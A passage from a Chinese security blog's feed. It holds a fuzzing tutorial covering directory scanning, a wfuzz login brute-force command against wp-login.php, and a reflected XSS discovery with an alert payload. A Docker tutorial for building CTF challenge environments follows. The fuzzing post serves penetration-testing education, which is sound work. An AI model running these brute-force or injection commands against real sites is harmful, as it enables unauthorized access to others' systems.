data-hmacdigest="689ab1602f692a776af0f28f271bacf18856db83cc75622f6b7cddbd1a43b3ec">94818f561542136a5f12a1f20ba90f292bf3a19ace642ed5d0b7a732ee6f35629bf7ac2faa56ebc10e31613a5c6803543d88c27b7ad5b70aba526b8571bd47b385068a590a45fda91f7995a54a60465504106ec44af0d55842ebac3a9ebc10f2736aa364d53605c13d2c3330965d4e48f3d203668f34061d67fa799bcdbe81fa944853250310a920db486364f5836bc6d24f91431c88914edc26a3c256b0ed7597b31cb32ec08848830ac6e15afeddf37d18470dab6e1b3bc2455b19535cdb87a1ce3d6fcc68c7595c5aaf5d7fd889a4f1646c1ea5388d4d5a9d30a2146e764615bae2b6d352be90cdb25c26232d00340e6cff7c66e6d2bdd10803ac1bd7e561fe8bc25e524209ad1a7e3be82bdcc655855bd9e7a3bc16cc202d00bbedc94784d4b93f239b232707ee850a062c85f00c2c1d6d911845400490016bdcf619923cf13421ab598234e4aaddfa7bb7dbd782a9e7179e2f74ed934c9447e4dd2ca3ba934471118d01d95934ce3f2452dc95ecfbdda5f21ca7f63bce9234356478f0ba746fe101148da8605ade56f6d7d23aab1de4a123f81d6af96a222a7bedac87349cec6692672b5d9babe7acc5df982726f87063177d0de2b831873e3f8651b5e0</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码，查看文章！</summary>
    
    
    
    <category term="Tools" scheme="http://lvpsectime.github.io/categories/Tools/"/>
    
    
    <category term="Tools" scheme="http://lvpsectime.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Fuzz与漏洞挖掘</title>
    <link href="http://lvpsectime.github.io/post/60782.html"/>
    <id>http://lvpsectime.github.io/post/60782.html</id>
    <published>2020-12-09T02:23:42.000Z</published>
    <updated>2020-12-09T08:01:08.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Fuzz一直是渗透测试中比较重要的技术，之前一直是听说并没有学习过，今天在漏洞银行看了一期视频<a href="https://www.bugbank.cn/live/view.html?id=111909">[87期]看Fuzz与漏洞挖掘擦出火花</a>，感觉讲的挺好的。在此记录一下。</p><h2 id="目录Fuzz-base"><a href="#目录Fuzz-base" class="headerlink" title="目录Fuzz(base)"></a>目录Fuzz(base)</h2><h3 id="Fuzz敏感目录"><a href="#Fuzz敏感目录" class="headerlink" title="Fuzz敏感目录"></a>Fuzz敏感目录</h3><h4 id="御剑"><a href="#御剑" class="headerlink" title="御剑"></a>御剑</h4><p>一款经典的目录扫描工具。</p><p>它的工作原理就是： <code>http://domain.com/+目录字典</code></p><p>一般我们的目录字典是这样子的</p><p><img src="/post/60782/1.png" alt="目录字典"></p><p>那么这种扫描有什么好处呢？就是针对一部分网站可以扫描的全面，只要你的字典足够强大就可以扫描到绝大多部分的目录和文件，来自<code>Blasting_dictionary</code>的爆破字典很好，github地址<code>https://github.com/rootphantomer/Blasting_dictionary</code>这里的103w+目录字典就很符合御剑的模式，其实也就是看程序员的命名。</p><h4 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h4><p>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件</p><p><a href="https://github.com/maurosoria/dirsearch">下载地址</a></p><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u url -e php</span><br></pre></td></tr></table></figure><h4 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a>Dirb</h4><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb url 字典</span><br></pre></td></tr></table></figure><p>kali自带字典<code>/usr/share/wordlist/dirb/...</code></p><h4 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h4><p>wfuzz据说是最好用的一款fuzz工具，不过每个人喜欢的都不一样，适合自己的才是最好的。</p><p>使用方法：<a href="https://blog.csdn.net/JBlock/article/details/88619117">wfuzz使用教程</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z file,/root/Desktop/Fuzzing/dic.txt URL/test/FUZZ</span><br><span class="line">wfuzz -z file,/root/Desktop/Fuzzing/dic.txt URL/test/FUZZ -hc 404</span><br><span class="line">wfuzz -z file,/root/Desktop/Fuzzing/dic.txt URL/test/FUZZ -hw 123 返回包大小</span><br><span class="line">wfuzz -z file,/root/Desktop/Fuzzing/dic.txt URL/test/FUZZ -hs &quot;Not found&quot; 返回内容</span><br><span class="line">wfuzz -c -z file,/root/dic1.txt -z file,/root/dic2.txt -hs xx1 -hs xx2 -d &quot;log=FUZZ&amp;pwd=FUZ2Z&quot; http://ip/wp-login.php</span><br></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="403"><a href="#403" class="headerlink" title="403"></a>403</h4><p><img src="/post/60782/2.png" alt="403"></p><h4 id="Hidden-XSS"><a href="#Hidden-XSS" class="headerlink" title="Hidden XSS"></a>Hidden XSS</h4><p>原文链接：<a href="https://markitzeroday.com/xss/finding/2018/02/03/hidden-xss.html">https://markitzeroday.com/xss/finding/2018/02/03/hidden-xss.html</a></p><p><img src="/post/60782/3.png"></p><p>用<code>Nikto</code>做目录Fuzz，发现了<code>/test/</code>目录，访问<code>/test/</code></p><p><img src="/post/60782/4.png"></p><p>返回<code>NULL</code>，接着使用<code>wfuzz</code>做参数Fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ wfuzz -w /usr/share/wordlists/dirb/common.txt --hh 53 &#x27;http://rob-sec-1.com/test/?FUZZ=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&#x27;</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.3 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: HTTP://rob-sec-1.com/test/?FUZZ=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">Total requests: 4614</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">IDResponse   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">02127:  C=200      9 L       8 W     84 Ch  &quot;item&quot;</span><br><span class="line"></span><br><span class="line">Total time: 14.93025</span><br><span class="line">Processed Requests: 4614</span><br><span class="line">Filtered Requests: 4613</span><br><span class="line">Requests/sec.: 309.0369</span><br></pre></td></tr></table></figure><p>发现了<code>item</code>参数，访问<code>http://domain/test/?item=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，成功弹窗</p><p><img src="/post/60782/5.png"></p><h2 id="参数Fuzz"><a href="#参数Fuzz" class="headerlink" title="参数Fuzz"></a>参数Fuzz</h2><p>以sqli-labs第29关为例</p><p>使用wfuzz自带的sqlfuzzer测试参数</p><p><img src="/post/60782/6.png" alt="wfuzz"></p><p>把结果导出为html文件</p><p><img src="/post/60782/7.png" alt="wfuzz"></p><p>看一下fuzz的结果</p><p><img src="/post/60782/8.png" alt="wfuzz"></p><p><img src="/post/60782/9.png" alt="wfuzz"></p><p>通过fuzz就发现这一关存在sql语句的报错！那么就有可能存在报错注入！fuzz更多时就会发现一些绕过它waf的情况。</p><h2 id="Payload-Fuzz-bypass"><a href="#Payload-Fuzz-bypass" class="headerlink" title="Payload Fuzz(bypass)"></a>Payload Fuzz(bypass)</h2><p>参考：<a href="https://blog.csdn.net/JBlock/article/details/88617906">FUZZ过某狗</a></p><p>所谓payload fuzz其实就是通过大量测试枚举字符组合，最终得到能够绕过WAF的有效载荷！</p><h2 id="URL跳转与SSRF"><a href="#URL跳转与SSRF" class="headerlink" title="URL跳转与SSRF"></a>URL跳转与SSRF</h2><p>参数Fuzz和payload fuzz</p><h2 id="后缀名Fuzz"><a href="#后缀名Fuzz" class="headerlink" title="后缀名Fuzz"></a>后缀名Fuzz</h2><p>文件上传，fuzz允许上传的后缀名</p><h2 id="CRLF-Fuzz"><a href="#CRLF-Fuzz" class="headerlink" title="CRLF Fuzz"></a>CRLF Fuzz</h2><p><code>CRLF</code>是<code>Carriage-Return Line-Feed</code>的缩写，意思是回车换行，回车(CR, ASCII 13, \r)，换行(LF, ASCII 10, \n)，CRLF字符(%0d%0a)</p><h2 id="XSS-Payload-Fuzz"><a href="#XSS-Payload-Fuzz" class="headerlink" title="XSS Payload Fuzz"></a>XSS Payload Fuzz</h2><p><a href="https://github.com/NytroRST/XSSFuzzer">XSS Fuzzer</a></p><p><img src="/post/60782/10.png" alt="wfuzz"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉Fuzz还是枚举吧，关键在于字典是否强大。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Fuzzdb</span><br><span class="line">https://github.com/Fuzzdb-project/Fuzzdb</span><br><span class="line">seclist</span><br><span class="line">https://github.com/danielmiessler/SecLists</span><br><span class="line">某大牛的字典</span><br><span class="line">https://github.com/bl4de/dictionaries/</span><br><span class="line">https://github.com/1N3/IntruderPayloads/</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Fuzz一直是渗透测试中比较重要的技术，之前一直是听说并没有学习过，今天在漏洞银行看了一期视频&lt;a href=&quot;https://www.bu</summary>
      
    
    
    
    <category term="渗透" scheme="http://lvpsectime.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="Fuzz" scheme="http://lvpsectime.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>Docker从0到1</title>
    <link href="http://lvpsectime.github.io/post/11960.html"/>
    <id>http://lvpsectime.github.io/post/11960.html</id>
    <published>2020-10-21T08:18:12.000Z</published>
    <updated>2020-11-04T06:41:26.933Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p><a href="https://www.cnblogs.com/wt7018/p/11880666.html" title="安装docker">安装docker</a><br><a href="https://blog.csdn.net/oYinHeZhiGuang/article/details/88791009" title="安装docker-compose">安装docker-compose</a><br><a href="https://www.cnblogs.com/hwlong/p/9158982.html" title="docker简介">docker简介</a></p><h2 id="0x01-Docker常用命令"><a href="#0x01-Docker常用命令" class="headerlink" title="0x01 Docker常用命令"></a>0x01 Docker常用命令</h2><p>以下命令均在root下<br>启动docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><p>查看当前镜像列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>导入镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker import [options] file|URL|- [REPOSITORY[:TAG]]</span><br><span class="line">例：</span><br><span class="line">docker import music.tar music:centos</span><br><span class="line">导入以前导出的用Dockerfile生成的镜像，然后修改它的REPOSITORY为music,TAG为centos</span><br></pre></td></tr></table></figure><p>导出镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker export [OPTIONS] CONTAINER</span><br><span class="line">例：</span><br><span class="line">docker export -o test-mysql.tar &lt;容器 ID&gt;</span><br></pre></td></tr></table></figure><p>进入镜像的终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -i music:centos /bin/bash</span><br><span class="line"></span><br><span class="line">退出： exit</span><br><span class="line">参数说明：</span><br><span class="line">-i: 交互式操作</span><br><span class="line">-t: 终端</span><br><span class="line">music:centos: 镜像</span><br><span class="line">/bin/bash: 交互式shell</span><br></pre></td></tr></table></figure><p>网络端口映射</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 1001:80 music:centos /run.sh</span><br><span class="line"></span><br><span class="line">-d: 后台运行</span><br><span class="line">-p: 指定端口 宿主机端口:容器端口</span><br></pre></td></tr></table></figure><p>删除容器进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm -f ID</span><br></pre></td></tr></table></figure><p>查看所有容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>查看正在运行的容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>docker停止一个容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器ID</span><br></pre></td></tr></table></figure><p>开启以关闭容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器ID</span><br></pre></td></tr></table></figure><p>删除镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi 镜像ID</span><br></pre></td></tr></table></figure><p>使用dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build . -t test-mysql</span><br><span class="line">docker build为创建镜像命令</span><br><span class="line">名称为test-mysql</span><br><span class="line">&#x27;.&#x27;表示当前目录即Dockerfile文件所在的目录</span><br></pre></td></tr></table></figure><p>进入一个以开启的容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 容器ID /bin/bash</span><br></pre></td></tr></table></figure><p>从宿主机复制文件到容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 本地文件 容器ID:路径</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker search [keywords] 搜寻与keywords相关的镜像</span><br><span class="line">docker images  查看本地的image镜像</span><br><span class="line">docker pull [image] 拉取镜像</span><br><span class="line">docker run -d -p [host port]:[docker port] [image] 新建一个docker容器，并映射端口号</span><br><span class="line">docker ps -a 查看运行中的docker容器</span><br><span class="line">docker exec -it [container id] bash 进入一个docker容器</span><br><span class="line">docker cp [本地路径] [container id]:[container 路径] 拷贝本地文件到docker</span><br><span class="line">docker start [container id] 启动一个docker容器</span><br><span class="line">docker stop [container id] 停止一个docker容器</span><br><span class="line">docker rm [container id] 删除一个docker容器(需要先停止容器才能删除容器)</span><br><span class="line">docker rmi [image id] 删除一个docker镜像(需要删除镜像对应的容器才能删除镜像)</span><br></pre></td></tr></table></figure><h2 id="0x02-实例"><a href="#0x02-实例" class="headerlink" title="0x02 实例"></a>0x02 实例</h2><p>下面以一道ctf为例<br>搜索环境镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search lamp</span><br></pre></td></tr></table></figure><p>拉取环境需要的镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tutum/lamp</span><br></pre></td></tr></table></figure><p>用镜像创建容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@test:~# docker run -d -p 8888:80 tutum/lamp</span><br><span class="line">cb0bc63b1ebbec1258c9eb0c97415a0ccf6a323a60cddcc361006f59f77a3c2e</span><br><span class="line">这一串数字为容器ID</span><br></pre></td></tr></table></figure><p>上传本地文件到容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp /home/test/2019JNUCTF/Web/easyupload/ cb0bc63b1ebbec1258c9eb:/var/www/html</span><br><span class="line">容器ID可以不用写全，只写前面几位也是可以的</span><br></pre></td></tr></table></figure><p>访问 <code>ip:8888/easyupload</code> 成功。<br><img src="/post/11960/1.png"></p><h2 id="0x03-Dockerfile"><a href="#0x03-Dockerfile" class="headerlink" title="0x03 Dockerfile"></a>0x03 Dockerfile</h2><p>我们可以把构建一道题目的过程分为以下具体三步。</p><ol><li>指定具体要使用的镜像</li><li>启动镜像，构建一个容器</li><li>移入相关的源码，构建容器里面的环境配置<br>在上面的实例中，我们第三步里面需要进行的操作只有把源码移入/var/www/html文件夹里面而已，但如果环境配置较为复杂，比如需要构建数据库，安装各种插件等，第三步需要的时间就太长了。如果我们改变下上面的步骤。变成：</li><li>指定使用的镜像</li><li>配置相关的环境，移入相关的代码</li><li>根据第二步的内容，把这些操作以类似于代码，程序的模式写入一个模板，让Docker根据这个模板来生成新的镜像</li><li>根据这个新的镜像来生成新的容器<br>如果是这么操作的话，带来的好处就是可以方便的构造出一个针对性的镜像。配置题目的时候，我们只需要根据这个我们创作的模板生成特制的镜像，直接按照这个镜像就可以直接生成环境了。这个需要的模板就是<code>Dockerfile</code>。<br><code>Dockerfile</code>是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。 Docker通过读取<code>Dockerfile</code>中的指令自动生成映像。<br><code>docker build</code>命令用于从Dockerfile构建映像。可以在<code>docker build</code>命令中使用-f标志指向文件系统中任何位置的<code>Dockerfile</code>。<br><code>Dockerfile</code> 一般分为四部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令，<code>#</code> 为 Dockerfile 中的注释。<br>Docker以从上到下的顺序运行<code>Dockerfile</code>的指令。为了指定基本映像，第一条指令必须是<code>FROM</code>。一个声明以＃字符开头则被视为注释。可以在Docker文件中使用<code>RUN</code>，<code>CMD</code>，<code>FROM</code>，<code>EXPOSE</code>，<code>ENV</code>等指令。</li></ol><p><strong>常用指令</strong><br>FROM： 指定基础镜像，必须为第一个命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FROM &lt;image&gt;</span><br><span class="line">FROM &lt;image&gt;:&lt;tag&gt;</span><br><span class="line">FROM &lt;image&gt;@&lt;digest&gt;</span><br><span class="line">例：</span><br><span class="line">  FROM php:5.6</span><br><span class="line">tag或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像</span><br></pre></td></tr></table></figure><p>MAINTAINER: 维护者信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MAINTAINER &lt;name&gt;</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">    MAINTAINER zhangsan</span><br><span class="line">MAINTAINER 123@163.com</span><br></pre></td></tr></table></figure><p>RUN: 构建镜像时执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RUN用于在镜像容器中执行命令，其有以下两种命令执行方式：</span><br><span class="line">shell执行</span><br><span class="line">RUN &lt;command&gt;</span><br><span class="line">exec执行</span><br><span class="line">RUN [&quot;executable&quot;, &quot;paraml&quot;, &quot;param2&quot;]</span><br><span class="line">RUN指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定--no-cache参数，如：docker build --no-cache</span><br></pre></td></tr></table></figure><p>ADD: 将本地文件添加到容器中，tar类型文件会自动解压（网络压缩资源不会被解压），可以访问网络资源，类似wget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ADD &lt;src&gt; ... &lt;dest&gt;</span><br><span class="line">ADD [&quot;&lt;src&gt;&quot;, ... &quot;&lt;dest&gt;&quot;] 用于支持包含空格的路径</span><br><span class="line">例：</span><br><span class="line">ADD hom* /mydir/  # 添加所有以 hom 开头的文件</span><br><span class="line">ADD hom?.txt /mydir/  # ?替代一个单字符，例如，home.txt</span><br><span class="line">ADD test mydir/  # 添加test到mydir</span><br></pre></td></tr></table></figure><p>COPY: 功能类似ADD，但是不会自动解压文件，也不能访问网络资源<br>CMD: 构建容器后调用，也就是在容器启动时才进行调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;] # 执行可执行文件，优先</span><br><span class="line">CMD [&quot;param1&quot;,&quot;param2&quot;]  # 设置了ENTRYPOINT，则直接调用ENTRYPOINT添加参数</span><br><span class="line">CMD command param1 param2  # 执行shell内部命令</span><br><span class="line"></span><br><span class="line">CMD echo &quot;This is a test.&quot; | wc -</span><br><span class="line">CMD [&quot;/usr/bin/wc&quot;,&quot;--help&quot;]</span><br><span class="line"></span><br><span class="line">CMD不同于RUN，CMD用于指定在容器启动时所要执行的命令，而RUN用于指定镜像构建时所要执行的命令。</span><br></pre></td></tr></table></figure><p>ENTRYPOINT: 配置容器，使其可执行化。配合CMD可省去 application，只使用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ENTRYPOINT [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]  # 可执行文件，优先</span><br><span class="line">ENTRYPOINT command param1 param2  # shell内部命令</span><br><span class="line">ENTRYPOINT与CMD非常类似，不同的是通过docker run执行的命令不会覆盖ENTRYPOINT，而docker run命令中指定的任何参数，都会被当做参数再次传递给ENTRYPOINT。Dockerfile中只允许有一个ENTRYPOINT命令，多指定时会覆盖前面的设置，而只执行最后的ENTRYPOINT指令。</span><br></pre></td></tr></table></figure><p>LABEL: 用于为镜像添加元数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...</span><br><span class="line">LABEL version=&quot;1.0&quot; description=&quot;this is a test&quot; by=&quot;ca5tle&quot;</span><br><span class="line">使用LABEL指定元数据时，一条LABEL指定可以指定一或多条元数据，指定多条元数据时不同元数据之间通过空格分隔。推荐所有的元数据通过一条LABEL指令指定，以免生成过多的中间镜像。</span><br></pre></td></tr></table></figure><p>ENV: 设置环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENV &lt;key&gt; &lt;value&gt;  # &lt;key&gt;之后的所有内容均会被视为其&lt;value&gt;的组成部分，因此一次只能设置一个变量</span><br><span class="line">ENV &lt;key&gt;=&lt;value&gt; ... # 可以设置多个变量，每个变量为一个&lt;key&gt;=&lt;value&gt;的键值对，如果&lt;key&gt;中包含空格，可以使用 \ 来进行转义，也可以用&quot;&quot;表示，另外 \ 也可以用于续行</span><br></pre></td></tr></table></figure><p>EXPOSE: 指定外界交互的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXPOSE &lt;port&gt; [&lt;port&gt;...]</span><br><span class="line"></span><br><span class="line">EXPOSE并不会让容器的端口访问到主机。要使其可访问，需要在docker run运行容器时通过-p来映射端口</span><br></pre></td></tr></table></figure><p>VOLUME: 用于指定持久化目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VOLUME [&quot;/path/to/dir&quot;]</span><br><span class="line">一个卷可以存在于一个或多个容器的指定目录，该目录可以绕过联合文件系统，并具有以下功能：</span><br><span class="line">1. 卷可以容器间共享和重用</span><br><span class="line">2. 容器并不一定要和其他容器共享卷</span><br><span class="line">3. 修改卷后会立即生效</span><br><span class="line">4. 对卷的修改不会对镜像产生影响</span><br><span class="line">5. 卷会一直存在，直到没有任何容器在使用它</span><br></pre></td></tr></table></figure><p>USER: 指定运行容器时的用户名或UID，后续的RUN也会使用指定用户。使用USER指定用户时，可以使用用户名、UID或GID，或者是两者组合。当服务不需要管理员权限时，可以通过该命令指定运行用户。并且可以在之前创建所需要的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USER user</span><br><span class="line">USER user:group</span><br><span class="line">USER uidU</span><br><span class="line">SER uid:gid</span><br><span class="line">USER user:gid</span><br><span class="line">USER uid:group</span><br><span class="line">使用USER指定用户后，Dockerfile中其后的命令RUN、CMD、ENTRYPOINT都将使用该用户。镜像构建完成后，通过docker run运行容器时，可以通过-u参数来覆盖所指定的用户。</span><br></pre></td></tr></table></figure><p>ARG: 用于指定传递给构建运行时的变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ARG &lt;name&gt;</span><br></pre></td></tr></table></figure><p>ONBUILD: 用于设置镜像触发器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ONBUILD [INSTRUCTION]</span><br><span class="line">例：</span><br><span class="line">ONBUILD ADD . /app/src</span><br><span class="line">当所构建的镜像被用做其它镜像的基础镜像，该镜像中的触发器将会被钥触发</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/wt7018/p/</summary>
      
    
    
    
    <category term="Docker" scheme="http://lvpsectime.github.io/categories/Docker/"/>
    
    
    <category term="docker" scheme="http://lvpsectime.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>SOCKS代理</title>
    <link href="http://lvpsectime.github.io/post/15027.html"/>
    <id>http://lvpsectime.github.io/post/15027.html</id>
    <published>2020-10-20T11:40:26.000Z</published>
    <updated>2020-10-21T10:31:52.846Z</updated>
    
